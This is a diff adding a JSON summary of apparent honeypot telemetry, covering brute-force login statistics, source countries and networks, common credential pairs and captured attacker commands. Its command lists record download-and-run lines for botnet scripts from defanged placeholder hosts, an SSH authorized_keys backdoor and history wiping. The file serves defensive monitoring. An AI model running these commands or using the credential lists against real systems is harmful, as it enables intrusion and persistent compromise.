@@ -1,0 +1,1650 @@
+{
+ "schema": 1,
+ "dataset": "sample",
+ "generated_at": "2026-10-26T06:16:42Z",
+ "window": {
+  "start": "2026-10-11T23:20:01Z",
+  "end": "2026-10-25T23:20:01Z",
+  "days": 14,
+  "first_event": "2026-10-11T23:37:02Z",
+  "last_event": "2026-10-25T23:20:01Z"
+ },
+ "totals": {
+  "sessions": 3000,
+  "ssh_sessions": 2572,
+  "telnet_sessions": 428,
+  "login_attempts": 8578,
+  "login_successes": 1065,
+  "unique_sources": 218,
+  "countries": 42,
+  "asns": 124,
+  "commands": 4773,
+  "unique_commands": 33,
+  "payloads": 3,
+  "downloads_blocked": 296
+ },
+ "hourly": [
+  {
+   "t": "2026-10-19T00:00:00Z",
+   "sessions": 10,
+   "logins": 34
+  },
+  {
+   "t": "2026-10-19T01:00:00Z",
+   "sessions": 11,
+   "logins": 33
+  },
+  {
+   "t": "2026-10-19T02:00:00Z",
+   "sessions": 11,
+   "logins": 36
+  },
+  {
+   "t": "2026-10-19T03:00:00Z",
+   "sessions": 9,
+   "logins": 21
+  },
+  {
+   "t": "2026-10-19T04:00:00Z",
+   "sessions": 16,
+   "logins": 45
+  },
+  {
+   "t": "2026-10-19T05:00:00Z",
+   "sessions": 12,
+   "logins": 21
+  },
+  {
+   "t": "2026-10-19T06:00:00Z",
+   "sessions": 8,
+   "logins": 30
+  },
+  {
+   "t": "2026-10-19T07:00:00Z",
+   "sessions": 13,
+   "logins": 40
+  },
+  {
+   "t": "2026-10-19T08:00:00Z",
+   "sessions": 8,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-19T09:00:00Z",
+   "sessions": 9,
+   "logins": 24
+  },
+  {
+   "t": "2026-10-19T10:00:00Z",
+   "sessions": 10,
+   "logins": 28
+  },
+  {
+   "t": "2026-10-19T11:00:00Z",
+   "sessions": 5,
+   "logins": 10
+  },
+  {
+   "t": "2026-10-19T12:00:00Z",
+   "sessions": 10,
+   "logins": 33
+  },
+  {
+   "t": "2026-10-19T13:00:00Z",
+   "sessions": 9,
+   "logins": 34
+  },
+  {
+   "t": "2026-10-19T14:00:00Z",
+   "sessions": 5,
+   "logins": 8
+  },
+  {
+   "t": "2026-10-19T15:00:00Z",
+   "sessions": 3,
+   "logins": 9
+  },
+  {
+   "t": "2026-10-19T16:00:00Z",
+   "sessions": 20,
+   "logins": 56
+  },
+  {
+   "t": "2026-10-19T17:00:00Z",
+   "sessions": 18,
+   "logins": 52
+  },
+  {
+   "t": "2026-10-19T18:00:00Z",
+   "sessions": 25,
+   "logins": 61
+  },
+  {
+   "t": "2026-10-19T19:00:00Z",
+   "sessions": 25,
+   "logins": 68
+  },
+  {
+   "t": "2026-10-19T20:00:00Z",
+   "sessions": 28,
+   "logins": 75
+  },
+  {
+   "t": "2026-10-19T21:00:00Z",
+   "sessions": 34,
+   "logins": 104
+  },
+  {
+   "t": "2026-10-19T22:00:00Z",
+   "sessions": 21,
+   "logins": 65
+  },
+  {
+   "t": "2026-10-19T23:00:00Z",
+   "sessions": 24,
+   "logins": 77
+  },
+  {
+   "t": "2026-10-20T00:00:00Z",
+   "sessions": 21,
+   "logins": 60
+  },
+  {
+   "t": "2026-10-20T01:00:00Z",
+   "sessions": 29,
+   "logins": 81
+  },
+  {
+   "t": "2026-10-20T02:00:00Z",
+   "sessions": 39,
+   "logins": 107
+  },
+  {
+   "t": "2026-10-20T03:00:00Z",
+   "sessions": 34,
+   "logins": 103
+  },
+  {
+   "t": "2026-10-20T04:00:00Z",
+   "sessions": 39,
+   "logins": 117
+  },
+  {
+   "t": "2026-10-20T05:00:00Z",
+   "sessions": 37,
+   "logins": 116
+  },
+  {
+   "t": "2026-10-20T06:00:00Z",
+   "sessions": 27,
+   "logins": 62
+  },
+  {
+   "t": "2026-10-20T07:00:00Z",
+   "sessions": 42,
+   "logins": 115
+  },
+  {
+   "t": "2026-10-20T08:00:00Z",
+   "sessions": 27,
+   "logins": 71
+  },
+  {
+   "t": "2026-10-20T09:00:00Z",
+   "sessions": 16,
+   "logins": 41
+  },
+  {
+   "t": "2026-10-20T10:00:00Z",
+   "sessions": 14,
+   "logins": 34
+  },
+  {
+   "t": "2026-10-20T11:00:00Z",
+   "sessions": 7,
+   "logins": 14
+  },
+  {
+   "t": "2026-10-20T12:00:00Z",
+   "sessions": 3,
+   "logins": 9
+  },
+  {
+   "t": "2026-10-20T13:00:00Z",
+   "sessions": 6,
+   "logins": 18
+  },
+  {
+   "t": "2026-10-20T14:00:00Z",
+   "sessions": 5,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-20T15:00:00Z",
+   "sessions": 6,
+   "logins": 18
+  },
+  {
+   "t": "2026-10-20T16:00:00Z",
+   "sessions": 1,
+   "logins": 2
+  },
+  {
+   "t": "2026-10-20T17:00:00Z",
+   "sessions": 2,
+   "logins": 8
+  },
+  {
+   "t": "2026-10-20T18:00:00Z",
+   "sessions": 2,
+   "logins": 2
+  },
+  {
+   "t": "2026-10-20T19:00:00Z",
+   "sessions": 4,
+   "logins": 11
+  },
+  {
+   "t": "2026-10-20T20:00:00Z",
+   "sessions": 2,
+   "logins": 5
+  },
+  {
+   "t": "2026-10-20T21:00:00Z",
+   "sessions": 5,
+   "logins": 14
+  },
+  {
+   "t": "2026-10-20T22:00:00Z",
+   "sessions": 7,
+   "logins": 25
+  },
+  {
+   "t": "2026-10-20T23:00:00Z",
+   "sessions": 3,
+   "logins": 7
+  },
+  {
+   "t": "2026-10-21T00:00:00Z",
+   "sessions": 8,
+   "logins": 13
+  },
+  {
+   "t": "2026-10-21T01:00:00Z",
+   "sessions": 8,
+   "logins": 18
+  },
+  {
+   "t": "2026-10-21T02:00:00Z",
+   "sessions": 7,
+   "logins": 21
+  },
+  {
+   "t": "2026-10-21T03:00:00Z",
+   "sessions": 8,
+   "logins": 14
+  },
+  {
+   "t": "2026-10-21T04:00:00Z",
+   "sessions": 7,
+   "logins": 20
+  },
+  {
+   "t": "2026-10-21T05:00:00Z",
+   "sessions": 20,
+   "logins": 66
+  },
+  {
+   "t": "2026-10-21T06:00:00Z",
+   "sessions": 11,
+   "logins": 38
+  },
+  {
+   "t": "2026-10-21T07:00:00Z",
+   "sessions": 10,
+   "logins": 39
+  },
+  {
+   "t": "2026-10-21T08:00:00Z",
+   "sessions": 13,
+   "logins": 39
+  },
+  {
+   "t": "2026-10-21T09:00:00Z",
+   "sessions": 11,
+   "logins": 35
+  },
+  {
+   "t": "2026-10-21T10:00:00Z",
+   "sessions": 6,
+   "logins": 19
+  },
+  {
+   "t": "2026-10-21T11:00:00Z",
+   "sessions": 7,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-21T12:00:00Z",
+   "sessions": 10,
+   "logins": 27
+  },
+  {
+   "t": "2026-10-21T13:00:00Z",
+   "sessions": 5,
+   "logins": 11
+  },
+  {
+   "t": "2026-10-21T14:00:00Z",
+   "sessions": 7,
+   "logins": 20
+  },
+  {
+   "t": "2026-10-21T15:00:00Z",
+   "sessions": 4,
+   "logins": 12
+  },
+  {
+   "t": "2026-10-21T16:00:00Z",
+   "sessions": 3,
+   "logins": 4
+  },
+  {
+   "t": "2026-10-21T17:00:00Z",
+   "sessions": 2,
+   "logins": 2
+  },
+  {
+   "t": "2026-10-21T18:00:00Z",
+   "sessions": 3,
+   "logins": 8
+  },
+  {
+   "t": "2026-10-21T19:00:00Z",
+   "sessions": 0,
+   "logins": 0
+  },
+  {
+   "t": "2026-10-21T20:00:00Z",
+   "sessions": 6,
+   "logins": 13
+  },
+  {
+   "t": "2026-10-21T21:00:00Z",
+   "sessions": 4,
+   "logins": 15
+  },
+  {
+   "t": "2026-10-21T22:00:00Z",
+   "sessions": 4,
+   "logins": 10
+  },
+  {
+   "t": "2026-10-21T23:00:00Z",
+   "sessions": 10,
+   "logins": 37
+  },
+  {
+   "t": "2026-10-22T00:00:00Z",
+   "sessions": 10,
+   "logins": 28
+  },
+  {
+   "t": "2026-10-22T01:00:00Z",
+   "sessions": 6,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-22T02:00:00Z",
+   "sessions": 12,
+   "logins": 34
+  },
+  {
+   "t": "2026-10-22T03:00:00Z",
+   "sessions": 10,
+   "logins": 26
+  },
+  {
+   "t": "2026-10-22T04:00:00Z",
+   "sessions": 10,
+   "logins": 28
+  },
+  {
+   "t": "2026-10-22T05:00:00Z",
+   "sessions": 13,
+   "logins": 46
+  },
+  {
+   "t": "2026-10-22T06:00:00Z",
+   "sessions": 22,
+   "logins": 62
+  },
+  {
+   "t": "2026-10-22T07:00:00Z",
+   "sessions": 15,
+   "logins": 53
+  },
+  {
+   "t": "2026-10-22T08:00:00Z",
+   "sessions": 14,
+   "logins": 38
+  },
+  {
+   "t": "2026-10-22T09:00:00Z",
+   "sessions": 9,
+   "logins": 23
+  },
+  {
+   "t": "2026-10-22T10:00:00Z",
+   "sessions": 5,
+   "logins": 12
+  },
+  {
+   "t": "2026-10-22T11:00:00Z",
+   "sessions": 2,
+   "logins": 8
+  },
+  {
+   "t": "2026-10-22T12:00:00Z",
+   "sessions": 7,
+   "logins": 19
+  },
+  {
+   "t": "2026-10-22T13:00:00Z",
+   "sessions": 6,
+   "logins": 15
+  },
+  {
+   "t": "2026-10-22T14:00:00Z",
+   "sessions": 1,
+   "logins": 2
+  },
+  {
+   "t": "2026-10-22T15:00:00Z",
+   "sessions": 6,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-22T16:00:00Z",
+   "sessions": 3,
+   "logins": 9
+  },
+  {
+   "t": "2026-10-22T17:00:00Z",
+   "sessions": 1,
+   "logins": 2
+  },
+  {
+   "t": "2026-10-22T18:00:00Z",
+   "sessions": 5,
+   "logins": 5
+  },
+  {
+   "t": "2026-10-22T19:00:00Z",
+   "sessions": 1,
+   "logins": 1
+  },
+  {
+   "t": "2026-10-22T20:00:00Z",
+   "sessions": 4,
+   "logins": 10
+  },
+  {
+   "t": "2026-10-22T21:00:00Z",
+   "sessions": 7,
+   "logins": 25
+  },
+  {
+   "t": "2026-10-22T22:00:00Z",
+   "sessions": 9,
+   "logins": 25
+  },
+  {
+   "t": "2026-10-22T23:00:00Z",
+   "sessions": 9,
+   "logins": 26
+  },
+  {
+   "t": "2026-10-23T00:00:00Z",
+   "sessions": 7,
+   "logins": 22
+  },
+  {
+   "t": "2026-10-23T01:00:00Z",
+   "sessions": 8,
+   "logins": 19
+  },
+  {
+   "t": "2026-10-23T02:00:00Z",
+   "sessions": 15,
+   "logins": 49
+  },
+  {
+   "t": "2026-10-23T03:00:00Z",
+   "sessions": 10,
+   "logins": 25
+  },
+  {
+   "t": "2026-10-23T04:00:00Z",
+   "sessions": 15,
+   "logins": 49
+  },
+  {
+   "t": "2026-10-23T05:00:00Z",
+   "sessions": 17,
+   "logins": 47
+  },
+  {
+   "t": "2026-10-23T06:00:00Z",
+   "sessions": 22,
+   "logins": 66
+  },
+  {
+   "t": "2026-10-23T07:00:00Z",
+   "sessions": 11,
+   "logins": 37
+  },
+  {
+   "t": "2026-10-23T08:00:00Z",
+   "sessions": 5,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-23T09:00:00Z",
+   "sessions": 14,
+   "logins": 45
+  },
+  {
+   "t": "2026-10-23T10:00:00Z",
+   "sessions": 13,
+   "logins": 33
+  },
+  {
+   "t": "2026-10-23T11:00:00Z",
+   "sessions": 11,
+   "logins": 37
+  },
+  {
+   "t": "2026-10-23T12:00:00Z",
+   "sessions": 6,
+   "logins": 13
+  },
+  {
+   "t": "2026-10-23T13:00:00Z",
+   "sessions": 5,
+   "logins": 16
+  },
+  {
+   "t": "2026-10-23T14:00:00Z",
+   "sessions": 9,
+   "logins": 36
+  },
+  {
+   "t": "2026-10-23T15:00:00Z",
+   "sessions": 1,
+   "logins": 1
+  },
+  {
+   "t": "2026-10-23T16:00:00Z",
+   "sessions": 3,
+   "logins": 8
+  },
+  {
+   "t": "2026-10-23T17:00:00Z",
+   "sessions": 5,
+   "logins": 13
+  },
+  {
+   "t": "2026-10-23T18:00:00Z",
+   "sessions": 5,
+   "logins": 16
+  },
+  {
+   "t": "2026-10-23T19:00:00Z",
+   "sessions": 0,
+   "logins": 0
+  },
+  {
+   "t": "2026-10-23T20:00:00Z",
+   "sessions": 3,
+   "logins": 10
+  },
+  {
+   "t": "2026-10-23T21:00:00Z",
+   "sessions": 4,
+   "logins": 15
+  },
+  {
+   "t": "2026-10-23T22:00:00Z",
+   "sessions": 8,
+   "logins": 21
+  },
+  {
+   "t": "2026-10-23T23:00:00Z",
+   "sessions": 5,
+   "logins": 10
+  },
+  {
+   "t": "2026-10-24T00:00:00Z",
+   "sessions": 6,
+   "logins": 22
+  },
+  {
+   "t": "2026-10-24T01:00:00Z",
+   "sessions": 14,
+   "logins": 41
+  },
+  {
+   "t": "2026-10-24T02:00:00Z",
+   "sessions": 9,
+   "logins": 27
+  },
+  {
+   "t": "2026-10-24T03:00:00Z",
+   "sessions": 11,
+   "logins": 34
+  },
+  {
+   "t": "2026-10-24T04:00:00Z",
+   "sessions": 22,
+   "logins": 49
+  },
+  {
+   "t": "2026-10-24T05:00:00Z",
+   "sessions": 13,
+   "logins": 39
+  },
+  {
+   "t": "2026-10-24T06:00:00Z",
+   "sessions": 12,
+   "logins": 26
+  },
+  {
+   "t": "2026-10-24T07:00:00Z",
+   "sessions": 6,
+   "logins": 24
+  },
+  {
+   "t": "2026-10-24T08:00:00Z",
+   "sessions": 5,
+   "logins": 10
+  },
+  {
+   "t": "2026-10-24T09:00:00Z",
+   "sessions": 8,
+   "logins": 20
+  },
+  {
+   "t": "2026-10-24T10:00:00Z",
+   "sessions": 18,
+   "logins": 64
+  },
+  {
+   "t": "2026-10-24T11:00:00Z",
+   "sessions": 9,
+   "logins": 25
+  },
+  {
+   "t": "2026-10-24T12:00:00Z",
+   "sessions": 14,
+   "logins": 40
+  },
+  {
+   "t": "2026-10-24T13:00:00Z",
+   "sessions": 4,
+   "logins": 14
+  },
+  {
+   "t": "2026-10-24T14:00:00Z",
+   "sessions": 5,
+   "logins": 12
+  },
+  {
+   "t": "2026-10-24T15:00:00Z",
+   "sessions": 1,
+   "logins": 3
+  },
+  {
+   "t": "2026-10-24T16:00:00Z",
+   "sessions": 8,
+   "logins": 21
+  },
+  {
+   "t": "2026-10-24T17:00:00Z",
+   "sessions": 3,
+   "logins": 9
+  },
+  {
+   "t": "2026-10-24T18:00:00Z",
+   "sessions": 4,
+   "logins": 9
+  },
+  {
+   "t": "2026-10-24T19:00:00Z",
+   "sessions": 7,
+   "logins": 18
+  },
+  {
+   "t": "2026-10-24T20:00:00Z",
+   "sessions": 3,
+   "logins": 12
+  },
+  {
+   "t": "2026-10-24T21:00:00Z",
+   "sessions": 5,
+   "logins": 14
+  },
+  {
+   "t": "2026-10-24T22:00:00Z",
+   "sessions": 6,
+   "logins": 18
+  },
+  {
+   "t": "2026-10-24T23:00:00Z",
+   "sessions": 7,
+   "logins": 22
+  },
+  {
+   "t": "2026-10-25T00:00:00Z",
+   "sessions": 6,
+   "logins": 15
+  },
+  {
+   "t": "2026-10-25T01:00:00Z",
+   "sessions": 8,
+   "logins": 26
+  },
+  {
+   "t": "2026-10-25T02:00:00Z",
+   "sessions": 10,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-25T03:00:00Z",
+   "sessions": 13,
+   "logins": 39
+  },
+  {
+   "t": "2026-10-25T04:00:00Z",
+   "sessions": 11,
+   "logins": 36
+  },
+  {
+   "t": "2026-10-25T05:00:00Z",
+   "sessions": 12,
+   "logins": 33
+  },
+  {
+   "t": "2026-10-25T06:00:00Z",
+   "sessions": 11,
+   "logins": 29
+  },
+  {
+   "t": "2026-10-25T07:00:00Z",
+   "sessions": 10,
+   "logins": 32
+  },
+  {
+   "t": "2026-10-25T08:00:00Z",
+   "sessions": 8,
+   "logins": 21
+  },
+  {
+   "t": "2026-10-25T09:00:00Z",
+   "sessions": 6,
+   "logins": 9
+  },
+  {
+   "t": "2026-10-25T10:00:00Z",
+   "sessions": 16,
+   "logins": 44
+  },
+  {
+   "t": "2026-10-25T11:00:00Z",
+   "sessions": 12,
+   "logins": 35
+  },
+  {
+   "t": "2026-10-25T12:00:00Z",
+   "sessions": 7,
+   "logins": 23
+  },
+  {
+   "t": "2026-10-25T13:00:00Z",
+   "sessions": 5,
+   "logins": 15
+  },
+  {
+   "t": "2026-10-25T14:00:00Z",
+   "sessions": 2,
+   "logins": 4
+  },
+  {
+   "t": "2026-10-25T15:00:00Z",
+   "sessions": 6,
+   "logins": 17
+  },
+  {
+   "t": "2026-10-25T16:00:00Z",
+   "sessions": 5,
+   "logins": 13
+  },
+  {
+   "t": "2026-10-25T17:00:00Z",
+   "sessions": 5,
+   "logins": 14
+  },
+  {
+   "t": "2026-10-25T18:00:00Z",
+   "sessions": 1,
+   "logins": 1
+  },
+  {
+   "t": "2026-10-25T19:00:00Z",
+   "sessions": 4,
+   "logins": 11
+  },
+  {
+   "t": "2026-10-25T20:00:00Z",
+   "sessions": 1,
+   "logins": 1
+  },
+  {
+   "t": "2026-10-25T21:00:00Z",
+   "sessions": 4,
+   "logins": 6
+  },
+  {
+   "t": "2026-10-25T22:00:00Z",
+   "sessions": 3,
+   "logins": 6
+  },
+  {
+   "t": "2026-10-25T23:00:00Z",
+   "sessions": 3,
+   "logins": 6
+  }
+ ],
+ "daily": [
+  {
+   "d": "2026-10-11",
+   "sessions": 1
+  },
+  {
+   "d": "2026-10-12",
+   "sessions": 169
+  },
+  {
+   "d": "2026-10-13",
+   "sessions": 174
+  },
+  {
+   "d": "2026-10-14",
+   "sessions": 196
+  },
+  {
+   "d": "2026-10-15",
+   "sessions": 202
+  },
+  {
+   "d": "2026-10-16",
+   "sessions": 194
+  },
+  {
+   "d": "2026-10-17",
+   "sessions": 202
+  },
+  {
+   "d": "2026-10-18",
+   "sessions": 208
+  },
+  {
+   "d": "2026-10-19",
+   "sessions": 344
+  },
+  {
+   "d": "2026-10-20",
+   "sessions": 378
+  },
+  {
+   "d": "2026-10-21",
+   "sessions": 174
+  },
+  {
+   "d": "2026-10-22",
+   "sessions": 187
+  },
+  {
+   "d": "2026-10-23",
+   "sessions": 202
+  },
+  {
+   "d": "2026-10-24",
+   "sessions": 200
+  },
+  {
+   "d": "2026-10-25",
+   "sessions": 169
+  }
+ ],
+ "countries": [
+  {
+   "code": "US",
+   "name": "United States",
+   "sessions": 904
+  },
+  {
+   "code": "NO",
+   "name": "Norway",
+   "sessions": 304
+  },
+  {
+   "code": "JP",
+   "name": "Japan",
+   "sessions": 149
+  },
+  {
+   "code": "CA",
+   "name": "Canada",
+   "sessions": 147
+  },
+  {
+   "code": "VE",
+   "name": "Venezuela",
+   "sessions": 145
+  },
+  {
+   "code": "CN",
+   "name": "China",
+   "sessions": 128
+  },
+  {
+   "code": "GB",
+   "name": "United Kingdom",
+   "sessions": 119
+  },
+  {
+   "code": "IN",
+   "name": "India",
+   "sessions": 118
+  },
+  {
+   "code": "SA",
+   "name": "Saudi Arabia",
+   "sessions": 117
+  },
+  {
+   "code": "DE",
+   "name": "Germany",
+   "sessions": 107
+  },
+  {
+   "code": "BR",
+   "name": "Brazil",
+   "sessions": 97
+  },
+  {
+   "code": "FR",
+   "name": "France",
+   "sessions": 95
+  },
+  {
+   "code": "KR",
+   "name": "South Korea",
+   "sessions": 68
+  },
+  {
+   "code": "ES",
+   "name": "Spain",
+   "sessions": 66
+  },
+  {
+   "code": "IT",
+   "name": "Italy",
+   "sessions": 47
+  },
+  {
+   "code": "AU",
+   "name": "Australia",
+   "sessions": 39
+  },
+  {
+   "code": "NL",
+   "name": "The Netherlands",
+   "sessions": 35
+  },
+  {
+   "code": "BE",
+   "name": "Belgium",
+   "sessions": 34
+  },
+  {
+   "code": "NZ",
+   "name": "New Zealand",
+   "sessions": 32
+  },
+  {
+   "code": "CZ",
+   "name": "Czechia",
+   "sessions": 28
+  },
+  {
+   "code": "TW",
+   "name": "Taiwan",
+   "sessions": 26
+  },
+  {
+   "code": "MX",
+   "name": "Mexico",
+   "sessions": 19
+  },
+  {
+   "code": "MG",
+   "name": "Madagascar",
+   "sessions": 16
+  },
+  {
+   "code": "RU",
+   "name": "Russia",
+   "sessions": 16
+  },
+  {
+   "code": "HK",
+   "name": "Hong Kong",
+   "sessions": 15
+  },
+  {
+   "code": "SG",
+   "name": "Singapore",
+   "sessions": 15
+  },
+  {
+   "code": "TR",
+   "name": "Turkey",
+   "sessions": 15
+  },
+  {
+   "code": "DZ",
+   "name": "Algeria",
+   "sessions": 12
+  },
+  {
+   "code": "ID",
+   "name": "Indonesia",
+   "sessions": 12
+  },
+  {
+   "code": "LU",
+   "name": "Luxembourg",
+   "sessions": 11
+  },
+  {
+   "code": "TH",
+   "name": "Thailand",
+   "sessions": 11
+  },
+  {
+   "code": "EC",
+   "name": "Ecuador",
+   "sessions": 8
+  },
+  {
+   "code": "GT",
+   "name": "Guatemala",
+   "sessions": 8
+  },
+  {
+   "code": "QA",
+   "name": "Qatar",
+   "sessions": 7
+  },
+  {
+   "code": "IR",
+   "name": "Iran",
+   "sessions": 6
+  },
+  {
+   "code": "DO",
+   "name": "Dominican Republic",
+   "sessions": 5
+  },
+  {
+   "code": "SE",
+   "name": "Sweden",
+   "sessions": 5
+  },
+  {
+   "code": "PT",
+   "name": "Portugal",
+   "sessions": 4
+  },
+  {
+   "code": "AT",
+   "name": "Austria",
+   "sessions": 3
+  },
+  {
+   "code": "UA",
+   "name": "Ukraine",
+   "sessions": 3
+  },
+  {
+   "code": "ZA",
+   "name": "South Africa",
+   "sessions": 3
+  },
+  {
+   "code": "IE",
+   "name": "Ireland",
+   "sessions": 1
+  }
+ ],
+ "asns": [
+  {
+   "asn": 224,
+   "org": "SIKT - KUNNSKAPSSEKTORENS TJENESTELEVERANDOR",
+   "sessions": 299
+  },
+  {
+   "asn": 16509,
+   "org": "Amazon.com, Inc.",
+   "sessions": 244
+  },
+  {
+   "asn": 6306,
+   "org": "TELEFONICA VENEZOLANA, C.A.",
+   "sessions": 145
+  },
+  {
+   "asn": 39891,
+   "org": "Saudi Telecom Company JSC",
+   "sessions": 111
+  },
+  {
+   "asn": 749,
+   "org": "United States Department of Defense (DoD)",
+   "sessions": 90
+  },
+  {
+   "asn": 10429,
+   "org": "TELEFÔNICA BRASIL S.A",
+   "sessions": 65
+  },
+  {
+   "asn": 3356,
+   "org": "Level 3 Communications, Inc.",
+   "sessions": 63
+  },
+  {
+   "asn": 4134,
+   "org": "Chinanet",
+   "sessions": 58
+  },
+  {
+   "asn": 38266,
+   "org": "Vodafone Idea Ltd. (VIL)",
+   "sessions": 56
+  },
+  {
+   "asn": 2527,
+   "org": "Sony Network Communications Inc.",
+   "sessions": 53
+  },
+  {
+   "asn": 7922,
+   "org": "Comcast Cable Communications, LLC",
+   "sessions": 53
+  },
+  {
+   "asn": 12479,
+   "org": "Orange Espagne SA",
+   "sessions": 46
+  },
+  {
+   "asn": 8075,
+   "org": "Microsoft Corporation",
+   "sessions": 45
+  },
+  {
+   "asn": 13285,
+   "org": "TalkTalk Communications Limited",
+   "sessions": 39
+  },
+  {
+   "asn": 701,
+   "org": "Verizon Business",
+   "sessions": 38
+  }
+ ],
+ "usernames": [
+  {
+   "value": "root",
+   "count": 4189
+  },
+  {
+   "value": "admin",
+   "count": 1154
+  },
+  {
+   "value": "ubuntu",
+   "count": 518
+  },
+  {
+   "value": "user",
+   "count": 450
+  },
+  {
+   "value": "test",
+   "count": 445
+  },
+  {
+   "value": "pi",
+   "count": 272
+  },
+  {
+   "value": "postgres",
+   "count": 271
+  },
+  {
+   "value": "oracle",
+   "count": 243
+  },
+  {
+   "value": "ftpuser",
+   "count": 182
+  },
+  {
+   "value": "guest",
+   "count": 174
+  },
+  {
+   "value": "git",
+   "count": 172
+  },
+  {
+   "value": "ubnt",
+   "count": 170
+  },
+  {
+   "value": "support",
+   "count": 169
+  },
+  {
+   "value": "deploy",
+   "count": 90
+  },
+  {
+   "value": "hadoop",
+   "count": 79
+  }
+ ],
+ "passwords": [
+  {
+   "value": "123456",
+   "count": 1851
+  },
+  {
+   "value": "password",
+   "count": 960
+  },
+  {
+   "value": "admin",
+   "count": 798
+  },
+  {
+   "value": "root",
+   "count": 780
+  },
+  {
+   "value": "12345678",
+   "count": 581
+  },
+  {
+   "value": "123",
+   "count": 502
+  },
+  {
+   "value": "1234",
+   "count": 474
+  },
+  {
+   "value": "test",
+   "count": 387
+  },
+  {
+   "value": "qwerty",
+   "count": 378
+  },
+  {
+   "value": "admin123",
+   "count": 279
+  },
+  {
+   "value": "P@ssw0rd",
+   "count": 278
+  },
+  {
+   "value": "1qaz2wsx",
+   "count": 213
+  },
+  {
+   "value": "ubnt",
+   "count": 190
+  },
+  {
+   "value": "toor",
+   "count": 187
+  },
+  {
+   "value": "changeme",
+   "count": 185
+  }
+ ],
+ "credentials": [
+  {
+   "username": "root",
+   "password": "123456",
+   "count": 886
+  },
+  {
+   "username": "root",
+   "password": "password",
+   "count": 485
+  },
+  {
+   "username": "root",
+   "password": "admin",
+   "count": 390
+  },
+  {
+   "username": "root",
+   "password": "root",
+   "count": 361
+  },
+  {
+   "username": "root",
+   "password": "12345678",
+   "count": 284
+  },
+  {
+   "username": "admin",
+   "password": "123456",
+   "count": 280
+  },
+  {
+   "username": "root",
+   "password": "123",
+   "count": 244
+  },
+  {
+   "username": "root",
+   "password": "1234",
+   "count": 228
+  },
+  {
+   "username": "root",
+   "password": "test",
+   "count": 199
+  },
+  {
+   "username": "root",
+   "password": "qwerty",
+   "count": 181
+  }
+ ],
+ "client_versions": [
+  {
+   "value": "SSH-2.0-Go",
+   "count": 879
+  },
+  {
+   "value": "SSH-2.0-libssh_0.9.6",
+   "count": 535
+  },
+  {
+   "value": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10",
+   "count": 324
+  },
+  {
+   "value": "SSH-2.0-libssh2_1.11.0",
+   "count": 303
+  },
+  {
+   "value": "SSH-2.0-paramiko_3.4.0",
+   "count": 238
+  },
+  {
+   "value": "SSH-2.0-OpenSSH_7.4",
+   "count": 166
+  },
+  {
+   "value": "SSH-2.0-PuTTY_Release_0.80",
+   "count": 127
+  }
+ ],
+ "commands": [
+  {
+   "value": "cat /proc/cpuinfo | grep name | wc -l",
+   "count": 378
+  },
+  {
+   "value": "crontab -l",
+   "count": 378
+  },
+  {
+   "value": "free -m | grep Mem",
+   "count": 378
+  },
+  {
+   "value": "nproc",
+   "count": 378
+  },
+  {
+   "value": "uname -a",
+   "count": 378
+  },
+  {
+   "value": "w",
+   "count": 378
+  },
+  {
+   "value": "cd /tmp || cd /var/run || cd /mnt",
+   "count": 210
+  },
+  {
+   "value": "chmod +x bins.sh",
+   "count": 210
+  },
+  {
+   "value": "rm -rf bins.sh",
+   "count": 210
+  },
+  {
+   "value": "sh bins.sh",
+   "count": 210
+  },
+  {
+   "value": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0samplekeymaterialnotreal mdrfckr\" >> .ssh/authorized_keys && chmod -R go= ~/…",
+   "count": 180
+  },
+  {
+   "value": "cat /etc/os-release",
+   "count": 124
+  },
+  {
+   "value": "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+   "count": 124
+  },
+  {
+   "value": "ls -la /dev/shm",
+   "count": 124
+  },
+  {
+   "value": "uname -s -v -n -r -m",
+   "count": 124
+  }
+ ],
+ "recent_commands": [
+  {
+   "t": "2026-10-25T23:19:00Z",
+   "cmd": "history -c",
+   "country": "GB"
+  },
+  {
+   "t": "2026-10-25T23:19:00Z",
+   "cmd": "/dev/shm/.k",
+   "country": "GB"
+  },
+  {
+   "t": "2026-10-25T23:19:00Z",
+   "cmd": "chmod 777 /dev/shm/.k",
+   "country": "GB"
+  },
+  {
+   "t": "2026-10-25T23:19:00Z",
+   "cmd": "curl -s hxxp://198[.]51[.]100[.]x/x86_64 -o /dev/shm/.k",
+   "country": "GB"
+  },
+  {
+   "t": "2026-10-25T23:06:00Z",
+   "cmd": "curl -s hxxp://192[.]0[.]2[.]x/x86_64 -o /dev/shm/.k",
+   "country": "US"
+  },
+  {
+   "t": "2026-10-25T23:01:00Z",
+   "cmd": "rm -rf bins.sh",
+   "country": "BE"
+  },
+  {
+   "t": "2026-10-25T23:01:00Z",
+   "cmd": "sh bins.sh",
+   "country": "BE"
+  },
+  {
+   "t": "2026-10-25T23:01:00Z",
+   "cmd": "chmod +x bins.sh",
+   "country": "BE"
+  },
+  {
+   "t": "2026-10-25T23:01:00Z",
+   "cmd": "wget hxxp://cdn[.]botnet-sample[.]invalid/bins.sh",
+   "country": "BE"
+  },
+  {
+   "t": "2026-10-25T23:00:00Z",
+   "cmd": "cd /tmp || cd /var/run || cd /mnt",
+   "country": "BE"
+  },
+  {
+   "t": "2026-10-25T21:46:00Z",
+   "cmd": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0samplekeymaterialnotreal mdrfckr\" >> .ssh/authorized_keys && chmod -R go= ~/…",
+   "country": "VE"
+  },
+  {
+   "t": "2026-10-25T21:15:00Z",
+   "cmd": "wget hxxp://files[.]update-mirror[.]invalid/bins.sh",
+   "country": "GB"
+  },
+  {
+   "t": "2026-10-25T20:34:00Z",
+   "cmd": "crontab -l",
+   "country": "KR"
+  },
+  {
+   "t": "2026-10-25T20:34:00Z",
+   "cmd": "w",
+   "country": "KR"
+  },
+  {
+   "t": "2026-10-25T20:34:00Z",
+   "cmd": "free -m | grep Mem",
+   "country": "KR"
+  },
+  {
